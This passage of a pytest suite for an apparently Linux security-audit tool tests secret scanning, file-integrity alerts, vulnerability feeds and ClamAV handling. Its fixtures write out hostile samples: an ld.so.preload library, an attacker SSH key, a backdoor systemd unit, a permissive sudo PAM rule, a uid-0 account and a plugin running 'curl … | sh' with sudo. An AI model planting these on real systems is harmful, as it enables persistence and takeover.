    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    v.audit()
    assert v.set_dismissed("firewall", True)["ok"] is True
    assert v.set_dismissed("ld-preload", True)["ok"] is True
    assert v.set_dismissed("nonexistent", True)["ok"] is False
    c = {c["id"]: c for c in v.audit(peek=True)["checks"]}
    assert c["firewall"]["dismissed"] and c["ld-preload"]["dismissed"]
    assert c["ssh-server"]["dismissible"] is False          # passing: nothing to review


def test_reviews_survive_changing_numbers_but_not_new_evidence(v):
    put(Path(v.HOME, ".cache/app/old.bin"), "x" * 2_000_000)
    aged(Path(v.HOME, ".cache/app/old.bin"), 10)
    v.audit()
    assert v.set_dismissed("user-cache", True)["ok"]
    put(Path(v.HOME, ".cache/app/older.bin"), "x" * 3_000_000)
    aged(Path(v.HOME, ".cache/app/older.bin"), 10)
    assert {c["id"]: c for c in v.audit(peek=True)["checks"]}["user-cache"]["dismissed"]   # size changed
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    v.audit()
    assert v.set_dismissed("ld-preload", True)["ok"]
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n/usr/lib/libworse.so\n")
    assert not {c["id"]: c for c in v.audit(peek=True)["checks"]}["ld-preload"]["dismissed"]   # new evidence


def test_every_finding_without_its_own_fix_has_help(v):
    """Static guard: a check that can report warn, fail or info without a fix button must have
    How to fix text and a Learn button in CHECK_HELP."""
    import ast
    src = (REPO / "bin" / "vigil").read_text()
    tree = ast.parse(src)
    missing = set()
    for fn in [n for n in ast.walk(tree) if isinstance(n, ast.FunctionDef)]:
        cid = None
        for n in ast.walk(fn):
            if isinstance(n, ast.Assign) and isinstance(n.value, ast.Tuple) and n.value.elts \
                    and isinstance(n.value.elts[0], ast.Constant) and len(n.targets) == 1 \
                    and isinstance(n.targets[0], ast.Tuple) and n.targets[0].elts[0].id == "cid":
                cid = n.value.elts[0].value
        for n in ast.walk(fn):
            if not (isinstance(n, ast.Call) and getattr(n.func, "id", None) == "result" and len(n.args) > 3):
                continue
            st = n.args[3]
            statuses = {st.value} if isinstance(st, ast.Constant) else {"warn", "info"}
            has_fix = any(k.arg == "fix" for k in n.keywords) or len(n.args) > 7
            if statuses & {"warn", "fail", "info"} and not has_fix and fn.name not in ("_lynis_check", "audit"):
                if cid is None or cid not in v.CHECK_HELP:
                    missing.add((fn.name, cid))
    assert not missing, missing
    for cid, (howto, learn) in v.CHECK_HELP.items():
        assert howto and learn and learn[0] in ("terminal", "docs", "helper", "app"), cid


def test_dismissed_finding_does_not_notify(v):
    v.audit()                                    # baseline
    port_listening(v)
    v.set_dismissed("open-ports", True)
    assert "open-ports" not in v.audit()["new"]


def test_forged_dismissal_entries_are_ignored(v):
    port_listening(v)
    v.audit()
    p = Path(v.HOME, ".local/state/omarchy-vigil/state.json")
    state = json.loads(p.read_text())
    state["dismissed"] = [{"fp": "../../etc", "at": "x"}, "junk", {"fp": "open-ports:zz"}]
    p.write_text(json.dumps(state))
    assert not {c["id"]: c for c in v.audit()["checks"]}["open-ports"]["dismissed"]


def test_history_is_daily_and_capped(v):
    v.audit()
    v.audit()
    report = v.audit()
    assert len(report["history"]) == 1 and report["history"][0]["score"] == report["score"]
    p = Path(v.HOME, ".local/state/omarchy-vigil/state.json")
    state = json.loads(p.read_text())
    state["history"] = [{"at": "2026-01-%02dT10:00:00+0000" % d, "score": 50 + d} for d in range(1, 32)] + \
                       [{"at": "bad", "score": 1}, {"at": "2026-02-01", "score": 900}, {"at": "2026-02-02", "score": True}]
    p.write_text(json.dumps(state))
    hist = v.audit()["history"]
    assert len(hist) == v.HISTORY_MAX
    assert all(re.fullmatch(r"\d{4}-\d{2}-\d{2}", h["date"]) and 0 <= h["score"] <= 100 for h in hist)
    assert hist == sorted(hist, key=lambda h: h["date"])


def test_cli_dismiss_rejects_bad_ids():
    import subprocess
    vigil = str(REPO / "bin" / "vigil")
    for args in (["dismiss", "../x"], ["dismiss"], ["undismiss", "A"], ["dismiss", "a", "b"]):
        p = subprocess.run(["/usr/bin/python3", "-I", "-S", vigil] + args, capture_output=True, timeout=30)
        assert p.returncode == 2, args


# --------------------------------------------------------------------------
# Phase 4: secrets, known-bad packages, malware processes, file changes,
# plugin capabilities, arch-audit, ClamUI quarantine

def test_secrets_in_history_are_located_not_shown(v):
    token = "ghp_" + "A" * 36
    homefile(v, ".bash_history", "ls\ncurl -H 'Authorization: token %s' https://api.github.com\ncd\n" % token, 0o600)
    c = v.check_secrets()
    assert c["status"] == "warn" and "~/.bash_history, line 2" in c["detail"] and "GitHub token" in c["detail"]
    assert token not in json.dumps(c)



def test_loose_credential_files(v):
    homefile(v, ".aws/credentials", "[default]\n", 0o644)
    c = v.check_secrets()
    assert c["status"] == "warn" and c["fix"]["action"] == "credential-perms"
    assert v.run_fix("credential-perms")["ok"]
    assert stat.S_IMODE(os.stat(os.path.join(v.HOME, ".aws/credentials")).st_mode) == 0o600
    assert v.check_secrets()["status"] == "pass"


def test_credential_perms_never_follows_symlinks(v, tmp_path):
    target = put(tmp_path / "elsewhere", "x", 0o644)
    os.symlink(target, os.path.join(v.HOME, ".netrc"))
    v.run_fix("credential-perms")
    assert stat.S_IMODE(target.stat().st_mode) == 0o644



def test_file_changes_baseline_then_change_then_accept(v):
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\n")
    homefile(v, ".ssh/authorized_keys", "ssh-ed25519 AAAA me\n", 0o600)
    first = v.check_file_changes()
    assert first["status"] == "pass" and "Baseline recorded" in first["summary"]
    assert v.check_file_changes()["status"] == "pass"
    homefile(v, ".ssh/authorized_keys", "ssh-ed25519 AAAA me\nssh-ed25519 BBBB attacker\n", 0o600)
    sysfile(v, "/etc/systemd/system/backdoor.service", "[Service]\nExecStart=/tmp/x\n")
    c = v.check_file_changes()
    assert c["status"] == "warn" and "changed: ~/.ssh/authorized_keys" in c["detail"]
    assert "new: /etc/systemd/system/backdoor.service" in c["detail"]
    assert c["fix"]["action"] == "integrity-accept"
    assert v.run_fix("integrity-accept")["ok"]
    assert v.check_file_changes()["status"] == "pass"


def test_file_changes_symlinks_recorded_not_followed(v, tmp_path):
    target = put(tmp_path / "unit", "a")
    os.makedirs(v.ROOT + "/etc/systemd/system")
    os.symlink(target, v.ROOT + "/etc/systemd/system/alias.service")
    v.check_file_changes()
    target.write_text("b")                               # target changes, link does not
    assert v.check_file_changes()["status"] == "pass"


def test_file_changes_peek_does_not_create_baseline(v):
    v.audit(peek=True)
    assert not os.path.exists(os.path.join(v.HOME, ".local/state/omarchy-vigil/baseline.json"))


def test_arch_audit_parse():
    mod = load_vigil()
    got = mod.parse_arch_audit(ARCH_AUDIT_JSON)
    assert [p["name"] for p in got] == ["openssl", "libfoo"]
    assert got[0] == {"name": "openssl", "severity": "High", "fixed": True, "issues": 2}
    assert mod.parse_arch_audit("not json") is None and mod.parse_arch_audit('{"x": 1}') is None


def test_clamui_quarantine_count(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamui")
    for n in ("a.qtn", "b.qtn"):
        homefile(v, ".local/share/clamui/quarantine/" + n, "x", 0o600)
    c = v.check_clamui()
    assert "2 files in quarantine" in c["summary"]


def test_plugin_scan_says_when_it_did_not_scan(v, tmp_path):
    checkout = tmp_path / "checkout"
    put(checkout / "Panel.qml", 'Process { command: ["curl", url] }\n')
    put(checkout / "manifest.json", json.dumps({"name": "Dev Plugin"}))
    base = Path(v.HOME, ".config/omarchy/plugins")
    base.mkdir(parents=True)
    os.symlink(checkout, base / "me.dev")
    c = v.check_plugins()
    assert "Dev Plugin (me.dev): linked from another folder (development install), not scanned" in c["detail"]
    assert "no network" not in c["detail"]


# --------------------------------------------------------------------------
# Maintained sources (feeds) and the false-positive rules

ARCH_AUDIT_JSON = json.dumps({"avgs": [
    {"name": "AVG-1", "packages": ["openssl"], "status": "Vulnerable", "type": "x", "severity": "High",
     "fixed": "3.4.1-1", "issues": ["CVE-2026-1", "CVE-2026-2"]},
    {"name": "AVG-2", "packages": ["libfoo", "../evil"], "status": "Vulnerable", "type": "x", "severity": "Low",
     "fixed": None, "issues": ["CVE-2026-3"]},
]})


def test_no_hand_made_threat_lists():
    assert not (REPO / "data" / "known-bad.json").exists()
    src = (REPO / "bin" / "vigil").read_text()
    assert "known_bad" not in src and "systemd-initd" not in src


def test_disk_encryption_reads_dm_uuid(v, monkeypatch):
    sysfile(v, "/proc/self/mountinfo", "26 1 254:0 / / rw,relatime - btrfs /dev/mapper/root rw\n")
    monkeypatch.setattr(v, "_rdev", lambda p: os.makedev(254, 0) if p.endswith("/dev/mapper/root") else 0)
    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "CRYPT-LUKS2-abc-root\n")
    assert v.check_disk_encryption()["status"] == "pass"
    sysfile(v, "/sys/dev/block/254:0/dm/uuid", "LVM-xyz\n")
    c = v.check_disk_encryption()
    assert c["status"] == "warn" and v.dismissible(dict(c))   # true, but only a reinstall fixes it
    os.makedirs(v.ROOT + "/sys/dev/block/254:0/slaves/dm-1")
    sysfile(v, "/sys/dev/block/254:0/slaves/dm-1/dev", "254:1\n")
    sysfile(v, "/sys/dev/block/254:1/dm/uuid", "CRYPT-LUKS2-def\n")
    assert v.check_disk_encryption()["status"] == "pass"


def clamav(v):
    return [f for f in v.CHECKS if f.__name__ == "check_scanner_clamav"][0]


def test_clamav_signatures_come_from_freshclam(v):
    assert clamav(v)()["fix"]["action"] == "install-clamav"
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    c = clamav(v)()
    assert c["status"] == "warn" and c["fix"]["action"] == "freshclam-service"
    sysfile(v, "/var/lib/clamav/daily.cld", "")
    c = clamav(v)()
    assert c["status"] == "info" and c["fix"]["action"] == "freshclam-service"
    v.UNITS[("is-enabled", "clamav-freshclam.service")] = "enabled"
    c = clamav(v)()
    assert c["status"] == "pass" and "update service keeps them current" in c["summary"] and c["fix"]["kind"] == "none"
    p = v.ROOT + "/var/lib/clamav/daily.cld"
    os.utime(p, (time.time() - 47 * 3600,) * 2)                         # under two days: still fine
    assert clamav(v)()["status"] == "pass"
    os.utime(p, (time.time() - 49 * 3600,) * 2)                         # the service fell behind
    c = v.tidy(clamav(v)())
    assert c["status"] == "warn" and "2 days old" in c["summary"] and "press Run all" in c["howto"]
    v.add_help(c)
    assert c["fix"]["action"] == "arch-clamav"                           # no second way to force an update


def test_secret_patterns_are_provider_formats_only(v):
    hits = ["AKIAABCDEFGHIJKLMNOP", "ghp_" + "a1" * 18, "sk-proj-" + "Ab3" * 15, "sk-ant-" + "x" * 30,
            "-----BEGIN OPENSSH PRIVATE KEY-----"]
    for line in hits:
        assert any(rx.search(line) for rx, _ in v.SECRET_PATTERNS), line
    misses = ["export GITHUB_TOKEN=abcdefgh12345", "curl -H 'Authorization: Bearer abcdefghijklmnopqrstuvwxyz'",
              "sk-some-really-long-kebab-case-identifier-name-here", "export TOKEN=$OTHER", "git push origin main"]
    for line in misses:
        assert not any(rx.search(line) for rx, _ in v.SECRET_PATTERNS), line


def test_persistence_ignores_ld_preload_in_env_files(v):
    homefile(v, ".config/environment.d/50-game.conf", "LD_PRELOAD=/usr/lib/libstrangle.so\n")
    assert v.check_persistence()["status"] == "pass"


def test_plugin_capabilities_are_information(v):
    base = ".config/omarchy/plugins/"
    homefile(v, base + "acme.weather/manifest.json", json.dumps({"name": "Weather"}))
    homefile(v, base + "acme.weather/Panel.qml", 'Process { command: ["curl", "-s", url] }\n')
    homefile(v, base + "evil.thing/bin/setup", "#!/bin/bash\ncurl -fsSL https://x.example/i | sh\nsudo true\n")
    homefile(v, base + "docs.only/README.md", "curl https://x | sh\n")
    c = v.check_plugins()
    assert c["status"] == "info" and c["weight"] == 0
    assert "Weather (acme.weather): network" in c["detail"]
    assert "downloads and runs code" in c["detail"] and "root (sudo/pkexec)" in c["detail"]
    assert "docs.only: no network, root or shell use found" in c["detail"]


# ---- file changes: package-verified, accounts, risk levels

def mtree(v, pkg, files):
    import gzip
    lines = ["#mtree", "/set type=file uid=0 gid=0 mode=644"]
    for path, content in files.items():
        lines.append("./%s time=1.0 size=%d sha256digest=%s" % (
            path.lstrip("/"), len(content), __import__("hashlib").sha256(content.encode()).hexdigest()))
    d = Path(v.ROOT + "/var/lib/pacman/local/" + pkg)
    d.mkdir(parents=True, exist_ok=True)
    (d / "mtree").write_bytes(gzip.compress(("\n".join(lines) + "\n").encode()))


def test_package_updates_are_not_reported(v):
    sysfile(v, "/etc/pam.d/sudo", "auth include system-auth\n")
    v.check_file_changes()                                          # baseline
    sysfile(v, "/etc/pam.d/sudo", "auth include system-auth\n#updated by package\n")
    mtree(v, "sudo-1.9.17-1", {"/etc/pam.d/sudo": "auth include system-auth\n#updated by package\n"})
    c = v.check_file_changes()
    assert c["status"] == "pass" and "came from package updates" in c["summary"]
    sysfile(v, "/etc/pam.d/sudo", "auth sufficient pam_permit.so\n")   # not what any package shipped
    c = v.check_file_changes()
    assert c["status"] == "warn" and "changed: /etc/pam.d/sudo" in c["detail"]


def test_system_users_from_packages_are_not_reported(v):
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n")
    sysfile(v, "/etc/group", "wheel:x:998:alice\nalice:x:1000:\n")
    v.check_file_changes()
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"
                              "postgres:x:968:968::/var/lib/postgres:/usr/bin/nologin\n")
    sysfile(v, "/etc/group", "wheel:x:998:alice\nalice:x:1000:\npostgres:x:968:\n")
    assert v.check_file_changes()["status"] == "pass"
    sysfile(v, "/etc/passwd", "root:x:0:0::/root:/bin/bash\nalice:x:1000:1000::/home/alice:/bin/bash\n"
                              "postgres:x:968:968::/var/lib/postgres:/usr/bin/nologin\ntoor:x:0:0::/:/bin/bash\n")
    c = v.check_file_changes()
    assert c["status"] == "warn" and "/etc/passwd" in c["detail"]


def test_group_membership_change_is_reported(v):
    sysfile(v, "/etc/group", "wheel:x:998:alice\n")
    v.check_file_changes()
    sysfile(v, "/etc/group", "wheel:x:998:alice,mallory\n")
    assert v.check_file_changes()["status"] == "warn"


def test_own_shell_files_are_information_only(v):
    homefile(v, ".bashrc", "alias ll='ls -l'\n")
    v.check_file_changes()
    homefile(v, ".bashrc", "alias ll='ls -la'\n")
    c = v.check_file_changes()
    assert c["status"] == "info" and c["weight"] == 0 and c["fix"]["action"] == "integrity-accept"


def test_vigil_own_files_are_not_watched(v):
    v.check_file_changes()
    assert v.run_fix("optout-on")["ok"]
    assert v.check_file_changes()["status"] == "pass"


def test_hosts_file_is_not_watched(v):
    sysfile(v, "/etc/hosts", "127.0.0.1 localhost\n")
    v.check_file_changes()
    sysfile(v, "/etc/hosts", "127.0.0.1 localhost\n0.0.0.0 telemetry.example\n")
    assert v.check_file_changes()["status"] == "pass"


# ---- feeds

def test_arch_audit_parse():
    mod = load_vigil()
    got = mod.parse_arch_audit(ARCH_AUDIT_JSON)
    assert [p["name"] for p in got] == ["openssl", "libfoo"]
    assert mod.parse_arch_audit("not json") is None and mod.parse_arch_audit('{"x": 1}') is None


def arch_audit_check(v):
    spec = [s for s in v.SCANNERS if s[0] == "arch-audit"][0]
    return v._scanner_check(*spec)


def test_arch_audit_feed_only_counts_what_an_update_fixes(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    c = arch_audit_check(v)
    assert c["status"] == "info" and c["fix"]["action"] == "arch-audit-refresh"
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (1, ARCH_AUDIT_JSON)
    assert v.run_fix("arch-audit-refresh")["ok"]
    c = arch_audit_check(v)
    assert c["status"] == "warn" and c["fix"]["action"] == "update" and "1 serious" in c["summary"]
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    v.run_fix("arch-audit-refresh")
    assert arch_audit_check(v)["status"] == "pass"


def test_feed_due_and_retry(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    assert v.feed_due("arch-audit") is True
    res = v.refresh_due_feeds()                           # fake run fails: (None, "")
    assert res["ok"] is False and "tries again tomorrow" in res["message"]
    assert v.feed_due("arch-audit") is False              # tried today, waits a day
    p = Path(v.HOME, ".local/state/omarchy-vigil/arch-audit.json")
    meta = json.loads(p.read_text())
    meta["attempted"] = "2020-01-01"
    p.write_text(json.dumps(meta))
    assert v.feed_due("arch-audit") is True
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    assert v.refresh_due_feeds()["ok"] is True
    assert v.feed_due("arch-audit") is False
    meta = json.loads(p.read_text())
    meta["at"] = "2020-01-01"
    meta["attempted"] = "2020-01-01"
    p.write_text(json.dumps(meta))
    assert v.feed_due("arch-audit") is True               # a week or more old


def test_failed_refresh_keeps_last_good_result(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (1, ARCH_AUDIT_JSON)
    v.run_fix("arch-audit-refresh")
    del v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")]
    assert v.run_fix("arch-audit-refresh")["ok"] is False
    assert arch_audit_check(v)["status"] == "warn"


OSV_JSON = json.dumps({"results": [
    {"source": {"path": "/HOME/.cache/yay/atomic-pkg/bun.lock", "type": "lockfile"},
     "packages": [
         {"package": {"name": "js-digest", "version": "1.0.4", "ecosystem": "npm"},
          "vulnerabilities": [{"id": "GHSA-xxxx-yyyy-zzzz", "aliases": ["MAL-2026-1234"]}]},
         {"package": {"name": "lodash", "version": "4.17.20", "ecosystem": "npm"},
          "vulnerabilities": [{"id": "GHSA-35jh-r3h4-6jhm", "aliases": ["CVE-2021-23337"]}]},
     ]}]})


def test_osv_only_counts_confirmed_malware():
    mod = load_vigil()
    got = mod.parse_osv(OSV_JSON)
    assert [(m["name"], m["id"]) for m in got] == [("js-digest", "MAL-2026-1234")]
    assert mod.parse_osv("nope") is None and mod.parse_osv('{"results": "x"}') is None


def test_osv_check_states(v):
    c = v.check_osv()
    assert c["status"] == "info" and c["fix"]["action"] == "install-osv-scanner"
    v.TRUSTED.add(v.ROOT + "/usr/bin/osv-scanner")
    assert v.check_osv()["status"] == "pass"              # nothing to scan
    yay = os.path.join(v.HOME, ".cache/yay")
    os.makedirs(yay)
    assert v.check_osv()["fix"]["action"] == "osv-refresh"
    argv = ("/usr/bin/osv-scanner", "--format", "json", "--no-resolve", "--recursive", "--", yay)
    v.COMMANDS[argv] = (1, OSV_JSON.replace("/HOME", v.HOME))
    assert v.run_fix("osv-refresh")["ok"]
    c = v.check_osv()
    assert c["status"] == "fail" and "js-digest 1.0.4 (npm, MAL-2026-1234) in ~/.cache/yay/atomic-pkg/bun.lock" in c["detail"]
    assert "lodash" not in c["detail"]
    v.COMMANDS[argv] = (128, "")                          # no lockfiles found
    v.run_fix("osv-refresh")
    assert v.check_osv()["status"] == "pass"


def aur_url(names):
    return "https://aur.archlinux.org/rpc/v5/info?" + "&".join("arg%5B%5D=" + v_pct(n) for n in names)


def v_pct(n):
    return "".join(c if c in "abcdefghijklmnopqrstuvwxyz0123456789._-" else "%%%02X" % ord(c) for c in n)


def test_aur_status_is_information_only(v):
    v.TRUSTED |= {v.ROOT + "/usr/bin/pacman", v.ROOT + "/usr/bin/curl"}
    v.COMMANDS[("/usr/bin/pacman", "-Qmq")] = (0, "yay\nold-thing\nmoved-pkg\norphan-pkg\nlibc++\n")
    url = aur_url(["yay", "old-thing", "moved-pkg", "orphan-pkg", "libc++"])
    assert "libc%2B%2B" in url
    curl = ("/usr/bin/curl", "-q", "-sS", "--fail", "--proto", "=https", "--proto-redir", "=https",
            "--max-time", "30", "--max-filesize", str(4 * 1024 * 1024), "--", url)
    v.COMMANDS[curl] = (0, json.dumps({"results": [
        {"Name": "yay", "Maintainer": "jguer"}, {"Name": "orphan-pkg", "Maintainer": None},
        {"Name": "libc++", "Maintainer": "someone"}]}))
    v.COMMANDS[("/usr/bin/pacman", "-Slq")] = (0, "bash\nmoved-pkg\n")
    assert v.run_fix("aur-refresh")["ok"]
    c = v.check_aur_status()
    assert c["status"] == "info" and c["weight"] == 0
    assert "no longer in the AUR: old-thing" in c["detail"]
    assert "now in the official repositories: moved-pkg" in c["detail"]
    assert "no maintainer (orphaned): orphan-pkg" in c["detail"]


def test_aur_refresh_failure_is_retried(v):
    v.TRUSTED |= {v.ROOT + "/usr/bin/pacman", v.ROOT + "/usr/bin/curl"}
    v.COMMANDS[("/usr/bin/pacman", "-Qmq")] = (0, "yay\n")
    assert v.run_fix("aur-refresh")["ok"] is False        # curl fake returns nothing
    assert v.check_aur_status()["status"] == "info" and v.feed_due("aur") is False


# --------------------------------------------------------------------------
# Virus scan, Run list update, Run all and their schedules

def scan_argv(v):
    return tuple(v._clamscan_argv(v.HOME))


def fresh_signatures(v, hours_old=0):
    """ClamAV's signatures as its update service leaves them: freshclam.dat
    changes on every check. hours_old makes them that old."""
    p = sysfile(v, "/var/lib/clamav/freshclam.dat", "x")
    when = time.time() - hours_old * 3600
    os.utime(p, (when, when))
    try:
        os.remove(v.home_path(*v.STATE_DIR, v.FEED_FILES["signatures"]))     # Vigil's own update, if any
    except OSError:
        pass


def clamscan_ok(v, out="", rc=0):
    """A scan with this output. Detected files are created, and the second scan
    that confirms each one (by its own path) agrees, unless the test says otherwise.
    The signatures are current, as ClamAV's own update service keeps them."""
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamscan")
    fresh_signatures(v)
    v.COMMANDS[scan_argv(v)] = (rc, out)
    found = [l[:-len(" FOUND")].rsplit(": ", 1) for l in out.splitlines() if l.endswith(" FOUND") and ": " in l]
    paths = [p for p, _ in found if p.startswith(v.HOME + "/")]
    for p in paths:
        Path(p).parent.mkdir(parents=True, exist_ok=True)
        if not Path(p).exists():
            Path(p).write_bytes(b"MZ")
    if paths:
        v.COMMANDS[confirm_argv(paths)] = (1, "".join("%s: %s FOUND\n" % (p, sig) for p, sig in found
                                                       if p.startswith(v.HOME + "/")))


def confirm_argv(paths):
    return ("/usr/bin/nice", "-n", "19", "/usr/bin/clamscan", "--no-summary", "--stdout",
            "--follow-file-symlinks=0", "--") + tuple(paths)


def test_clamscan_never_follows_links_or_leaves_the_disk(v):
    argv = scan_argv(v)
    assert argv[:4] == ("/usr/bin/clamscan", "--recursive", "--no-summary", "--stdout")
    assert {"--cross-fs=no", "--follow-dir-symlinks=0", "--follow-file-symlinks=0"} <= set(argv)
    assert argv[-2:] == ("--", v.HOME)
    assert "--exclude-dir=^%s/\\.cache($|/)" % re.escape(v.HOME) in argv
    assert "--exclude-dir=/node_modules($|/)" in argv


def test_clamscan_parse():
    mod = load_vigil()
    mod.HOME = "/home/alice"
    out = ("/home/alice/Downloads/invoice.pdf.exe: Win.Trojan.Agent-123 FOUND\n"
           "/home/alice/Downloads/odd: name: with colons.zip: Eicar-Signature FOUND\n"
           "/home/alice/Downloads/<b>x</b>: Bad sig with spaces FOUND\n"
           "some warning line\n")
    got = mod.parse_clamscan(out)
    assert got == [{"path": "~/Downloads/invoice.pdf.exe", "signature": "Win.Trojan.Agent-123",
                    "file": "/home/alice/Downloads/invoice.pdf.exe"},
                   {"path": "~/Downloads/odd: name: with colons.zip", "signature": "Eicar-Signature",
                    "file": "/home/alice/Downloads/odd: name: with colons.zip"}]
    # The real path is kept only for plain paths inside the home folder.
    for odd in ("/etc/x: Eicar-Signature FOUND", "/home/alice/a\x1bb: Eicar-Signature FOUND",
                "/home/alice/../bob/x: Eicar-Signature FOUND"):
        assert "file" not in mod.parse_clamscan(odd)[0], odd


def test_virus_scan_states(v):
    assert v.check_virus_scan()["status"] == "info"                       # no ClamAV
    c_out = os.path.join(v.HOME, "Documents/x.exe") + ": Win.Test.EICAR_HDB-1 FOUND\n"
    clamscan_ok(v)
    c = v.check_virus_scan()
    assert c["status"] == "info" and c["fix"]["action"] == "virus-scan-now"
    clamscan_ok(v, os.path.join(v.HOME, "a.txt") + ": OK\n" + c_out, 1)
    assert v.run_fix("virus-scan-now")["ok"]
    c = v.check_virus_scan()
    assert c["status"] == "fail" and "~/Documents/x.exe: Win.Test.EICAR_HDB-1" in c["detail"]
    assert c["summary"].startswith("1 infected file. ~ scanned ") and "(weekly check)" in c["summary"]
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamui")
    assert v.check_virus_scan()["fix"]["kind"] == "app"                   # hand off quarantine to ClamUI
    clamscan_ok(v)
    v.run_fix("virus-scan-now")
    assert v.check_virus_scan()["status"] == "pass"


def test_virus_scan_error_is_not_a_clean_result(v):
    clamscan_ok(v, "LibClamAV Error: cli_loaddbdir(): No supported database files found\n", 2)
    assert v.run_fix("virus-scan-now")["ok"] is False
    assert v.check_virus_scan()["status"] == "info"                       # still "first scan pending"


def test_virus_scan_reports_progress(v, capsys):
    for n in range(5):
        put(Path(v.HOME, "Documents", "f%d" % n), "x")
    assert v.count_home_files() == 5
    put(Path(v.HOME, ".cache", "big"), "x")                               # skipped, as in the scan
    put(Path(v.HOME, "proj", "node_modules", "m.js"), "x")
    assert v.count_home_files() == 5
    lines = "".join(os.path.join(v.HOME, "Documents/f%d" % n) + ": OK\n" for n in range(5))
    clamscan_ok(v, lines)
    seen = []
    import itertools
    clock = itertools.count(0, 3)                                         # every line looks 3 s apart
    real = v.time.monotonic
    v.time.monotonic = lambda: float(next(clock))
    try:
        v.refresh_virus_scan(lambda done, total: seen.append((done, total)))
    finally:
        v.time.monotonic = real
    assert seen and seen[-1] == (5, 5)


def test_progress_lines_for_the_panel(v, capsys, monkeypatch):
    v.PROGRESS["on"] = True
    monkeypatch.setattr(v, "FEED_REFRESH", {"arch-audit": lambda: None})
    monkeypatch.setattr(v, "feed_available", lambda n: n in ("arch-audit", "full-scan"))
    v.refresh_due_feeds(daily_only=True)
    out = [json.loads(l) for l in capsys.readouterr().out.splitlines()]
    assert out == [{"progress": {"step": 1, "of": 1, "doing": "Arch security scan",
                                 "done": 0, "total": 0, "at": 0.0, "span": 1.0}}]


def test_two_timers_daily_and_weekly(v, monkeypatch):
    ran = []

    def fake(name):
        def go(cb=None):
            ran.append(name)
            v.save_feed(name, {})
        return go
    fresh_signatures(v)
    monkeypatch.setattr(v, "FEED_REFRESH", {"arch-audit": fake("arch-audit")})
    monkeypatch.setattr(v, "refresh_virus_scan", fake("virus-scan"))
    monkeypatch.setattr(v, "feed_available", lambda n: n in ("arch-audit", "virus-scan", "full-scan"))
    # Daily check: the Arch security scan, which fetches its list as it runs.
    v.refresh_due_feeds(daily_only=True)
    assert ran == ["arch-audit"]
    # Background run: the daily check just ran, the weekly check never did.
    ran.clear()
    v.refresh_due_feeds()
    assert ran == ["virus-scan"]
    # Nothing due now.
    ran.clear()
    assert v.refresh_due_feeds()["message"] == "Everything is up to date."
    assert ran == []
    # Run all button: everything.
    v.refresh_due_feeds(full=True)
    assert ran == ["arch-audit", "virus-scan"]


def test_report_says_when_something_is_due(v):
    assert v.audit(peek=True)["feedsDue"] is True                         # the first full scan
    v.refresh_due_feeds()
    assert v.audit(peek=True)["feedsDue"] is False
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    assert v.audit(peek=True)["feedsDue"] is True


def test_countdowns_to_the_next_daily_and_weekly_check(v):
    from datetime import datetime, timedelta
    assert v.next_daily() == ""                                           # nothing daily set up
    assert v.next_full_scan() == "now"                                    # never ran: due now
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (0, '{"avgs": []}')
    before = datetime.now().replace(second=0, microsecond=0)
    v.refresh_due_feeds(daily_only=True)
    day = datetime.strptime(v.next_daily(), "%Y-%m-%d %H:%M")
    assert timedelta(days=1) <= day - before <= timedelta(days=1, minutes=1)   # a day, to the minute
    assert v.next_full_scan() == "now"
    v.refresh_due_feeds(full=True)
    assert re.fullmatch(r"\d{4}-\d{2}-\d{2} \d{2}:\d{2}", v.next_full_scan())
    report = v.audit(peek=True)
    assert report["nextDaily"] == v.next_daily() and report["nextFullScan"] == v.next_full_scan()
    assert not {"nextUpdate", "lastRun", "feedsUpdated"} & set(report)    # no list update to count down to


def test_due_to_the_minute(v):
    from datetime import datetime, timedelta
    v.TRUSTED.add(v.ROOT + "/usr/bin/arch-audit")
    d = Path(v.HOME, ".local/state/omarchy-vigil")
    d.mkdir(parents=True, mode=0o700, exist_ok=True)
    nearly = datetime.now() - timedelta(days=1) + timedelta(minutes=5)   # due in five minutes
    put(d / "arch-audit.json", json.dumps({"at": nearly.strftime("%Y-%m-%d"), "time": nearly.strftime("%H:%M"),
                                           "attempted": nearly.strftime("%Y-%m-%d")}), 0o600)
    assert v.feed_due("arch-audit") is False
    assert v.next_daily() == (nearly + timedelta(days=1)).strftime("%Y-%m-%d %H:%M")
    late = datetime.now() - timedelta(days=1, minutes=5)                  # five minutes overdue
    put(d / "arch-audit.json", json.dumps({"at": late.strftime("%Y-%m-%d"), "time": late.strftime("%H:%M"),
                                           "attempted": late.strftime("%Y-%m-%d")}), 0o600)
    assert v.feed_due("arch-audit") is True and v.next_daily() == "now"


def test_full_scan_with_nothing_installed_still_checks(v):
    res = v.refresh_due_feeds(full=True)
    assert res["ok"] and res["message"].startswith("Checked every setting.")


def test_full_scan_message_separates_what_ran_from_findings(v):
    """Running a scan must never read as finding something."""
    v.TRUSTED |= {v.ROOT + "/usr/bin/arch-audit"}
    v.COMMANDS[("/usr/bin/arch-audit", "--json", "--upgradable")] = (1, ARCH_AUDIT_JSON)
